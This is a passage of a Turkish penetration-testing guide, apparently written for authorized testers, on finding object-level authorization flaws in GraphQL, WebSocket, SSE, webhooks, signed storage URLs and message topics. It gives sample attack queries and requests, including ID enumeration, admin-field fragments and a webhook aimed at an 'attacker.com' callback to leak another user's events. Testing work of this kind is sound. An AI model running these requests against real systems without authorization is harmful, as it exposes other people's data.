# 69. GraphQL Introspection ve Field Suggestion ile Gizli Object'lerin Keşfi

GraphQL introspection açıksa:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

Veya field suggestion ile:

```graphql
{
  user(id: "111") {
    id
    email
    secretField    # hata mesajı "Did you mean secret_field?"
  }
}
```

Gizli object type'lar ve field'lar keşfedilebilir; bunlar object-level authorization testi için yeni hedefler oluşturur.

## Error message ile object existence leakage (GraphQL-özel blind IDOR)

Bölüm 44'teki "blind IDOR" mantığının GraphQL'deki karşılığı, hata
mesajının kendisinin object'in var olup olmadığını doğrulamasıdır:

```graphql
query { user(id: "222") { id } }
```

İki farklı hata mesajı, iki farklı sinyal verir:

```json
{"errors": [{"message": "User 222 not found"}]}
```

```json
{"errors": [{"message": "Access denied to user 222"}]}
```

İlk mesaj object'in var olup olmadığı hakkında hiçbir şey söylemiyor
(hem gerçekten yok hem de "yetkin yok" durumunda aynı mesaj dönebilir —
bu aslında doğru/güvenli bir davranıştır). İkinci mesaj ise object'in
**var olduğunu doğrudan doğruluyor** (yalnızca erişim reddedildi) —
bu, saldırgana geçerli ID'leri enumerate etme imkanı tanıyan bir bilgi
ifşasıdır ve bölüm 44'teki "response farklılığı üzerinden dolaylı
tespit" prensibiyle aynı kök nedeni paylaşır. Object'in kendisine erişim
sağlanmasa bile, bu ayrım tek başına bir bulgu (bilgi ifşası) olarak
raporlanabilir.

---

# 70. GraphQL Fragment ve Directive Manipülasyonu

```graphql
query {
  user(id: "111") {
    ... on AdminUser {
      secretData
    }
  }
}
```

Veya directive ile:

```graphql
query {
  user(id: "111") {
    email @include(if: true)
    adminField @skip(if: false)
  }
}
```

Type condition ve directive manipülasyonu ile normalde erişilemeyen field'lar expose edilebilir.

---

# 71. GraphQL Batching / Aliasing ile Toplu IDOR Testi

GraphQL batching ile tek request'te birden fazla object sorgulanabilir:

```graphql
query {
  order1: order(id: "1001") { id owner }
  order2: order(id: "1002") { id owner }
  order3: order(id: "1003") { id owner }
}
```

Bu, tek tek request atmaya gerek kalmadan çoklu object ownership testini hızlandırır. Ayrıca:

```graphql
query {
  user(id: "111") {
    orders {
      id
      invoice { id downloadUrl }
    }
  }
}
```

gibi nested query'lerde her seviyede authorization kontrol edilmelidir.

## Alias + fragment kombinasyonu ile karma yetki seviyesi sorgulama

Bölüm 70'teki fragment/directive manipülasyonu ile yukarıdaki alias
tabanlı batching birleştirildiğinde, tek bir query içinde **farklı
object'lerin farklı yetki seviyesindeki field'ları** aynı anda
sorgulanabilir:

```graphql
query {
  a: user(id: "111") { ...UserFields }
  b: user(id: "222") { ...UserFields ...AdminFields }
}
```

Burada `a` (kendi hesabı) için normal field set'i, `b` (başka bir
kullanıcı) için ise hem normal hem admin-only field set'i (`AdminFields`)
istenmektedir. Eğer backend yetki kontrolünü yalnızca query'nin en üst
seviyesinde (ör. "bu kullanıcı admin mi") yapıp, her bir alias'ın kendi
`id` argümanına göre ayrı ayrı authorization uygulamıyorsa, `b` object'i
için `AdminFields` sızdırılabilir — hem bölüm 69 (field suggestion) hem
bölüm 70 (fragment) hem de bu bölümün (batching) kesiştiği bir zafiyet
sınıfıdır.

## Automatic Persisted Queries (APQ) ile object reference manipülasyonu

Modern GraphQL implementasyonlarında (Apollo, Relay) sorgu metni yerine
önceden hash'lenmiş bir referans gönderilebilir:

```http
GET /graphql?extensions={"persistedQuery":{"version":1,"sha256Hash":"abc123..."}}&variables={"id":"222"}
```

Burada `sha256Hash` sunucu tarafında önceden kayıtlı bir query'ye işaret
eder, ama `variables` (içindeki object ID dahil) genellikle client'tan
serbestçe gelir. Test edilmesi gereken noktalar:

```text
1. Aynı sha256Hash, farklı variables (farklı object ID) ile tekrar
   kullanılabiliyor mu? (beklenen davranış — asıl soru bu variables'ın
   authorization'dan geçip geçmediği)
2. APQ cache'i, hash'i variables'tan bağımsız olarak kabul edip
   query'nin kendisini yeniden doğrulamıyor mu? (cache poisoning'e
   yakın bir davranış — bkz. bölüm 49 "Cache" ailesi)
3. Sunucu, persisted query'nin ilk kayıt anındaki variables kümesiyle
   mi sınırlıyor, yoksa her istekte serbest variables mı kabul
   ediyor?
```

Asıl authorization sorusu değişmez: `variables.id` üzerinden gelen
object referansı, her zaman bölüm 8/31'deki A/B token-swap testine
tabidir — APQ yalnızca bu referansın taşınma biçimini değiştirir.

---

# 72. WebSocket Upgrade Header Manipülasyonu

WebSocket handshake sırasında:

```http
GET /ws/messages HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: ...
X-User-ID: 111
```

WebSocket bağlantısı kurulduktan sonra gönderilen mesajlarda object reference değiştirilebilir. Ayrıca WebSocket over HTTP/2 veya farklı subprotocol'ler farklı authorization davranışı gösterebilir.

---

# 73. Server-Sent Events (SSE) ve Object Authorization

```http
GET /api/events?user_id=111
Accept: text/event-stream
```

SSE stream'inde object reference manipülasyonu ile başka kullanıcının event'lerine abone olunabilir. Stream başladıktan sonra gönderilen event ID'leri ve data içindeki object reference'lar da incelenmelidir.

---

# 76. API Version Negotiation ile Authorization Bypass

```http
Accept: application/vnd.api.v1+json
Accept: application/vnd.api.v2+json
```

Veya:

```http
/api/v1/orders/1002
/api/v2/orders/1002
/api/beta/orders/1002
/api/internal/orders/1002
/api/dev/orders/1002
```

Farklı versiyonlarda farklı authorization mantığı olabilir. Özellikle `internal`, `dev`, `beta`, `staging`, `debug` prefix'leri test edilmelidir.

---

# 77. Feature Flag / A/B Test Parametreleri ile Authorization Bypass

```http
GET /api/orders/1002?feature=new_auth
GET /api/orders/1002?ab_test=variant_b
GET /api/orders/1002?enable_beta=true
```

Feature flag'ler farklı code path'leri aktive edebilir ve bu path'lerde object-level authorization eksik olabilir.

---

# 82. PostMessage / Web Messaging ile Object Reference Sızıntısı

SPA uygulamalarda:

```javascript
window.postMessage({type: "getUserData", userId: "111"}, "*");
```

Eğer origin kontrolü yoksa veya `*` kullanılıyorsa, attacker'in sayfasından victim'in oturumuyla object reference manipülasyonu yapılabilir.

---

# 83. LocalStorage / SessionStorage Manipülasyonu

SPA'lerde client-side storage'da tutulan object reference'lar:

```javascript
localStorage.setItem("currentOrderId", "1002");
```

Bu değerler manipüle edilerek farklı object'lerin API'ye gönderilmesi sağlanabilir. Bu frontend-only bir kontrol değil, API'nin bu değeri doğrulayıp doğrulamadığı test edilmelidir.

---

# 84. Service Worker / Cache API Manipülasyonu

Service Worker'lar request/response'ları intercept edebilir. Eğer Service Worker'da object reference manipülasyonu yapılıyorsa veya cache key'de identity bilgisi yoksa, cross-user cache poisoning oluşabilir.

---

# 85. GraphQL Subscription ve Real-time Object Authorization

```graphql
subscription {
  messageReceived(userId: "111") {
    id
    content
    sender
  }
}
```

Subscription'lar real-time veri akışı sağlar. `userId` parametresi değiştirilerek başka kullanıcının real-time event'lerine abone olunabilir.

---

# 86. gRPC-Web ve Binary Protobuf IDOR

gRPC-Web uygulamalarında protobuf binary formatı kullanılır:

```http
POST /grpc.service.Method
Content-Type: application/grpc-web+proto
```

Protobuf message'larındaki object ID'ler değiştirilebilir. gRPC-Web transcoding ile REST endpoint'leri arasındaki authorization farkları da test edilmelidir.

---

# 87. Serverless / Lambda Function Authorization Farkları

AWS Lambda, Azure Functions, Google Cloud Functions gibi serverless mimarilerde:

```text
API Gateway → Lambda A (auth check)
         ↓
         Lambda B (no auth check)
```

Her Lambda function'ın ayrı authorization mantığı olabilir. Aynı object reference farklı Lambda'lar arasında farklı davranış gösterebilir.

---

# 88. Kubernetes / Istio Service Mesh Authorization Bypass

Istio AuthorizationPolicy ve NetworkPolicy yapılandırmaları:

```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
```

Service mesh seviyesindeki authorization, application seviyesinden farklı çalışabilir. Aynı object reference farklı service'ler arasında farklı yetkilendirme ile karşılaşabilir.

---

# 89. GraphQL Federation ve Subgraph Authorization

GraphQL federation'da:

```graphql
query {
  user(id: "111") {
    orders {      # @key directive ile Orders subgraph'e yönlendirilir
      id
      invoice {   # Invoice subgraph'e yönlendirilir
        id
      }
    }
  }
}
```

Her subgraph'in ayrı authorization mantığı olabilir. Parent subgraph auth doğru olsa bile child subgraph'lerde BOLA olabilir.

---

# 90. Webhook Callback ve Object Reference Manipülasyonu

Webhook registration endpoint'leri:

```http
POST /api/webhooks
{
  "url": "https://attacker.com/callback",
  "event": "order.updated",
  "order_id": "1002"
}
```

Eğer webhook callback'inde object reference client-controlled ise ve authorization yapılmıyorsa, victim'in object'leri hakkında bilgi sızdırılabilir veya action tetiklenebilir.

## Webhook delivery verification (alıcı taraf doğrulaması)

Yukarıdaki senaryo webhook **kaydını** (registration) hedefliyor. Ayrıca
webhook **teslimatının (delivery) kendisi** de ayrı bir test yüzeyidir:
agent kendi kontrolündeki bir webhook endpoint'i kaydettirip, gelen
event payload'larını inceleyebilir:

```text
1. Webhook payload'unda bir object reference (ör. order_id, user_id)
   var mı?
2. Bu webhook'u alan sunucu (yani hedef uygulamanın kendisi, event'i
   işlerken), payload'daki object ID'nin gerçekten BU webhook
   subscription'ını tetikleyen kaynağa/tenant'a ait olduğunu
   doğruluyor mu?
3. Saldırgan, kendi hesabı için kayıtlı bir event'i tetikleyip
   (ör. kendi siparişini güncelleyip) webhook'ta dönen payload'ı
   manipüle ederek — veya event'in kendisini paylaşılan bir
   event bus/queue üzerinden yakalayarak — başka bir kullanıcının
   object ID'sini içeren bir payload'ı BAŞKA bir endpoint'e
   (uygulamanın webhook-consume endpoint'ine) gönderip o object
   üzerinde işlem tetikleyebiliyor mu?
```

Bu, klasik "IDOR"dan farklı bir yönde çalışır: saldırgan object
referansını **kendi ürettiği bir payload içinde** hedef sisteme geri
gönderir. Sistem bu payload'ı işlerken, payload'daki `order_id`'nin
gerçekten bu webhook event'ini üreten kaynağa ait olduğunu doğrulamıyorsa
(ör. yalnızca bir shared secret/signature ile payload'ın kaynağını
doğrulayıp, payload İÇİNDEKİ object'in o kaynağa ait olup olmadığını
ayrıca kontrol etmiyorsa), bu bölüm 5'teki relationship graph
invariant'larının (`O belongs_to T`) webhook-consume endpoint'inde
atlandığı bir authorization hatasıdır.

---

# 100. Presigned / Signed Cloud Storage URL IDOR

Modern uygulamalar dosyaları doğrudan sunucu üzerinden değil, S3/GCS/Azure
Blob gibi bir cloud storage'dan **presigned/signed URL** ile sundurur:

```http
POST /api/files/1002/download-url
Authorization: Bearer TOKEN_A

→ 200 OK
{
  "url": "https://bucket.s3.amazonaws.com/users/111/report.pdf?X-Amz-Signature=...&X-Amz-Expires=3600"
}
```

Bu pattern'de klasik object-level authorization kontrolü **yalnızca URL
üretme endpoint'inde** çalışır; URL'in kendisi üretildikten sonra imzayı
taşıyan herkes (paylaşılsa bile) dosyaya erişebilir. Test edilmesi gereken
noktalar farklıdır:

```text
1. URL üretme endpoint'i gerçekten ownership kontrolü yapıyor mu?
   (bkz. bölüm 8 — A token + B object dosyası için URL istenebiliyor mu?)
2. Object key/path tahmin edilebilir mi?
   /users/111/report.pdf  → /users/222/report.pdf
   (bucket'ın kendisi public/misconfigured ise imza gerekmeden erişilebilir)
3. İmza süresi (expiry) makul mü, yoksa çok uzun/sınırsız mı?
4. İmza yalnızca GET için mi geçerli, yoksa aynı imzalanmış URL ile
   PUT/DELETE de mümkün mü? (aşırı geniş scope)
5. Upload URL'i (presigned PUT) başka bir kullanıcının namespace/prefix'ine
   yazmaya izin veriyor mu? (bkz. bölüm 52 "Dosya upload/overwrite IDOR")
6. Bucket doğrudan taranabilir mi? (ör. ListBucket izni yanlışlıkla public)
```

Bu sınıf, klasik IDOR'dan farklı olarak "sunucu tarafı authorization" ile
"depolama katmanı authorization"ının birbirinden ayrışmasından kaynaklanır;
URL üretimi korunsa bile depolama katmanının kendisi (bucket policy, ACL,
imza scope'u) ayrı bir yetkilendirme sınırıdır ve ayrı test edilmelidir.

---

# 103. Pub-Sub / Mesaj Kuyruğu Topic-Level Authorization (MQTT / Kafka / Redis / WebSocket Topics)

Gerçek zamanlı özellikler (bildirimler, canlı güncellemeler, chat) çoğunlukla
bir topic/kanal isimlendirme şemasına dayanır:

```text
MQTT:    users/1002/notifications
Kafka:   user-events-1002
Redis:   channel:user:1002
WS/SSE:  subscribe { "channel": "orders.1002" }
```

Bölüm 22 ve 72'de anlatılan WebSocket object authorization'ının bir
uzantısı olarak, burada asıl soru şudur: **istemci topic ismini kendisi mi
belirliyor, yoksa sunucu authenticated identity'ye göre mi atıyor?**

```text
1. Client, subscribe isteğinde topic/channel adını (ör. user ID içeren
   bir string) doğrudan gönderebiliyor mu?
2. Sunucu, subscribe isteğini kabul etmeden önce bu topic'in
   authenticated kullanıcıya ait olup olmadığını doğruluyor mu?
3. Broker seviyesinde (MQTT ACL, Kafka topic ACL, Redis pub/sub) bir
   yetkilendirme katmanı var mı, yoksa yetkilendirme yalnızca ilk
   bağlantı/handshake anında mı yapılıp sonraki subscribe'lar
   serbest mi bırakılıyor?
4. Wildcard subscribe (`users/+/notifications`, `users/*`) engellenmiş mi?
```

Broker'a doğrudan erişim kapsam dışıysa (çoğunlukla öyledir), bu test
yalnızca uygulamanın **istemciye açtığı** subscribe/topic-seçim
arayüzü üzerinden yapılmalıdır.

---
